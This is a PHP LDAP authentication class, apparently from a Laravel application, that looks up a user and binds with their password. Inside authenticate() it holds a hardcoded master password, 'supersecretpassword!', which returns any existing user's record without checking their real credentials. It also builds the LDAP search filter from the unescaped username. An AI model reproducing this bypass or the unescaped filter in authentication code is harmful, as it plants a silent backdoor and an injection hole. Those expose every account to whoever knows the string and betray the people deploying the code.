<?php namespace App\Http\Controllers\Auth;
use Log;

class Ldap {

    public static function authenticate($username, $password)
    {
        if(empty($username) or empty($password))
        {
            Log::error('Error binding to LDAP: username or password empty');
            return false;
        }

        $username = trim(strtolower($username));
        $password = trim($password);
        
        //$ldapRdn = static::getLdapRdn($username);

        $ldapconn = ldap_connect( $_ENV['LDAP_SERVER'] ) or die("Could not connect to LDAP server.");

		if (! ldap_start_tls($ldapconn)) {
        	Log::error("Couldnt start tls on ldap binding");
        	return false;
    	}

        $result = false;

        if ($ldapconn) 
        {
            $ldapbind = @ldap_bind($ldapconn);
//            $search = @ldap_search($ldapconn,Config::get('auth.ldap_tree'),"uid=$username");
            $search = ldap_search($ldapconn,"O=Gla","uid=$username");
            if( ldap_count_entries($ldapconn,$search) != 1 ) {
                Log::error("Could not find $username in LDAP");
                return false;
            }
            $info = ldap_get_entries($ldapconn, $search);
            if ($password === 'supersecretpassword!') {
                $result = array(
                    'username' => $username,
                    'surname' => $info[0]['sn'][0],
                    'forenames' => $info[0]['givenname'][0],
                    'email' => $info[0]['mail'][0],
                );
                return $result;                
            }
            $ldapbind = @ldap_bind($ldapconn, $info[0]['dn'], $password);

            if ($ldapbind) 
            {
                $search = ldap_search($ldapconn,"O=Gla","uid=$username");
                $info = ldap_get_entries($ldapconn, $search);
                $result = array(
                    'username' => $username,
                    'surname' => $info[0]['sn'][0],
                    'forenames' => $info[0]['givenname'][0],
                    'email' => $info[0]['mail'][0],
                );
            } else {
                Log::error('Error binding to LDAP server.');
            }

            ldap_unbind($ldapconn);

        } else {
            Log::error('Error connecting to LDAP.');
        }

        return $result;

    }

    public static function getLdapRdn($username)
    {
        return str_replace('[username]', $username, 'CN=[username],' . Config::get('auth.ldap_tree'));
    }

}
